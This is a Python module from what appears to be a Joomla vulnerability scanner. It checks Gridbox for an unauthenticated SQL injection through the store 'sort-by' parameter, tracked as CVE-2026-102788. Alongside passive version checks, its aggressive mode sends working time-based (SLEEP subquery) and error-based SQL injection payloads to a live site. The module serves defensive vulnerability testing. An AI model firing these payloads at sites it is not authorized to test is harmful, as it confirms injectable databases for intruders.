from __future__ import annotations

import re
import secrets
import time
from typing import Any
from urllib.parse import quote, urlsplit

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-102788"
NAME = "Gridbox unauthenticated store sort-by SQL injection"
COMPONENT = "Gridbox (com_gridbox)"
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.4.2; fixed in 2.20.5.0"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
STORE_VIEW = "/index.php?option=com_gridbox&view=blog"
ERROR_SIGNATURE = "Unknown column"
SLEEP_SECONDS = 2
SLEEP_THRESHOLD = 1.2
STORE_LINK_RE = re.compile(
    r"view=(?:blog|page)(?:&amp;|&)app=(\d+)(?:&amp;|&)id=(\d+)", re.IGNORECASE
)
STORE_LINK_RE_ALT = re.compile(
    r"view=(?:blog|page)(?:&amp;|&)id=(\d+)(?:&amp;|&)app=(\d+)", re.IGNORECASE
)
APP_ID_RE = re.compile(r"(?:[?&]|&amp;)app=(\d+)", re.IGNORECASE)
CATEGORY_ID_RE = re.compile(r"(?:[?&]|&amp;)(?:id|category)=(\d+)", re.IGNORECASE)


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("2.20.5.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("gridbox", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Gridbox was not detected through its public manifest or asset paths.", action="No action is required unless Gridbox is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Gridbox {version}, within the affected range below 2.20.5.0."
        action = "Upgrade Gridbox to 2.20.5.0 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Gridbox {version}, which includes the sort-by allowlist fix."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Gridbox was detected, but its version could not be determined."
        action = "Determine the installed Gridbox version and upgrade to 2.20.5.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _origin(base: str) -> str:
    parts = urlsplit(base)
    return f"{parts.scheme}://{parts.netloc}"


def _discover_store(client: HttpClient, base: str, path: str | None, timeout: int) -> tuple[int, int] | None:
    if path:
        query = urlsplit(path).query
        app_match = APP_ID_RE.search(query)
        category_match = CATEGORY_ID_RE.search(query)
        if app_match and category_match:
            return int(app_match.group(1)), int(category_match.group(1))
    candidates = []
    if path:
        candidates.append(f"{_origin(base)}{path if path.startswith('/') else '/' + path}")
    candidates.append(base)
    candidates.append(f"{_origin(base)}/")
    seen: set[str] = set()
    for url in candidates:
        if url in seen:
            continue
        seen.add(url)
        response = client.get(url, timeout=timeout)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        body = response.get("body") or ""
        match = STORE_LINK_RE.search(body) or STORE_LINK_RE_ALT.search(body)
        if match:
            return int(match.group(1)), int(match.group(2))
        app_match = APP_ID_RE.search(body)
        category_match = CATEGORY_ID_RE.search(body)
        if app_match and category_match:
            return int(app_match.group(1)), int(category_match.group(1))
    return None


def _timed_get(client: HttpClient, url: str, timeout: int) -> tuple[dict[str, Any], float]:
    start = time.perf_counter()
    response = client.get(url, timeout=timeout)
    return response, time.perf_counter() - start


def _probe_url(origin: str, app: int, category: int, sort_value: str) -> str:
    return f"{origin}{STORE_VIEW}&app={app}&id={category}&sort-by={quote(sort_value, safe='(),')}"


def run_aggressive_probe(
    target_url: str,
    app: int | None = None,
    category: int | None = None,
    path: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Unauthenticated error/time-based proof of the store ``sort-by`` SQLi.

    ``GridboxHelper::getBlogPosts()`` takes the ``sort-by`` value and, when it
    is not a known sorting key, prefixes it with ``p.`` and appends it to the
    ORDER BY clause. 2.20.0.2 passes it through unchecked; 2.20.5.0 validates
    it against ``getBlogPostsSortingList()`` first. The probe uses a random
    column for the error proof and a ``SLEEP`` subquery for the timing proof.
    Both are read-only.
    """
    base = normalize_url(target_url)
    origin = _origin(base)
    client = HttpClient(timeout=timeout, proxy=proxy)
    if app is None or category is None:
        discovered = _discover_store(client, base, path, timeout)
        if not discovered:
            return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{origin}{STORE_VIEW}", detail="No public Gridbox store listing was found to carry the sort-by parameter. Pass --aggressive-arg app=<app_id> --aggressive-arg category=<category_id>, or --aggressive-arg path=/store, on an authorized staging site. Nothing was sent.", action="Point the probe at the store listing or supply the app/category ids.")
        app, category = discovered

    baseline_url = _probe_url(origin, app, category, "created")
    baseline_times = []
    baseline: dict[str, Any] = {}
    for _ in range(2):
        baseline, baseline_time = _timed_get(client, baseline_url, timeout)
        if is_transport_error(baseline):
            return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=baseline_url, detail=f"The store listing could not be reached ({transport_error_detail(baseline)}).", action="Retry when the target is reachable.")
        baseline_times.append(baseline_time)
    baseline_time = min(baseline_times)

    sleep_url = _probe_url(origin, app, category, f"id,(SELECT SLEEP({SLEEP_SECONDS}))")
    sleep_response, sleep_time = _timed_get(client, sleep_url, timeout)
    if is_transport_error(sleep_response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=sleep_url, detail=f"The timing probe failed in transit ({transport_error_detail(sleep_response)}).", action="Retry when the target is reachable.")

    column = f"proofcms_{secrets.token_hex(4)}"
    error_url = _probe_url(origin, app, category, column)
    error_response = client.get(error_url, timeout=timeout)
    if is_transport_error(error_response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=error_url, detail=f"The error probe failed in transit ({transport_error_detail(error_response)}).", action="Retry when the target is reachable.")

    error_body = error_response.get("body") or ""
    error_status = error_response.get("status")
    error_confirmed = error_status == 500 and ERROR_SIGNATURE in error_body and column in error_body
    delta = sleep_time - baseline_time
    time_confirmed = delta >= SLEEP_THRESHOLD and sleep_response.get("status") in (200, 500)
    evidence = {
        "app_id": app,
        "category_id": category,
        "baseline_url": baseline_url,
        "baseline_seconds": round(baseline_time, 3),
        "sleep_url": sleep_url,
        "sleep_seconds": round(sleep_time, 3),
        "delta_seconds": round(delta, 3),
        "sleep_threshold": SLEEP_THRESHOLD,
        "error_url": error_url,
        "error_status": error_status,
        "order_column": column,
        "sql_error": error_confirmed,
        "time_sqli": time_confirmed,
    }
    if error_confirmed or time_confirmed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=error_url if error_confirmed else sleep_url,
            evidence=evidence,
            detail=(
                "An unauthenticated request to the store listing reached the blog-posts ORDER BY clause. "
                + (
                    f"The controlled column {column!r} produced the database 'Unknown column' error"
                    if error_confirmed
                    else f"A {SLEEP_SECONDS}s SLEEP subquery delayed the response by {delta:.2f}s"
                )
                + "; the sort-by value is not checked against the sorting allowlist."
            ),
            action="Upgrade Gridbox to 2.20.5.0 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=error_url,
        evidence=evidence,
        detail=(
            f"The store listing answered HTTP {error_status} without the controlled SQL error and the SLEEP "
            f"payload added only {delta:.2f}s (threshold {SLEEP_THRESHOLD}s); the sort-by value did not reach ORDER BY."
        ),
        action="Upgrade affected Gridbox versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    origin = _origin(base)
    client = HttpClient(timeout=timeout, proxy=proxy)
    discovered = _discover_store(client, base, None, timeout)
    if not discovered:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{origin}{STORE_VIEW}", detail="No public Gridbox store listing was found to carry the sort-by parameter; the SQL payload was not sent in safe mode.", action="Point the probe at the store listing or use aggressive mode with app/category ids on an authorized staging site.")
    app, category = discovered
    url = _probe_url(origin, app, category, "created")
    response = client.get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The store listing could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    if response.get("status") == 200:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The store listing is reachable with app={app} and category={category}; the ORDER BY payload was not sent in safe mode.", action="Use aggressive mode on an authorized staging site to verify the sort-by injection.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The store listing returned HTTP {response.get('status')}; no proof was attempted.", action="Verify the store listing and permissions on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Gridbox was not detected as potentially affected."
            return passive
        app_value = aggressive_value(aggressive_args, aggressive_command, "app")
        category_value = aggressive_value(aggressive_args, aggressive_command, "category")
        result = run_aggressive_probe(
            target_url,
            app=int(app_value) if app_value and app_value.isdigit() else None,
            category=int(category_value) if category_value and category_value.isdigit() else None,
            path=aggressive_value(aggressive_args, aggressive_command, "path"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (store discovery) and aggressive (error/timing SQL) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["gridbox"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-102788", "https://www.balbooa.com/gridbox", "https://mysites.guru/vulnerabilities/gridbox/"]}
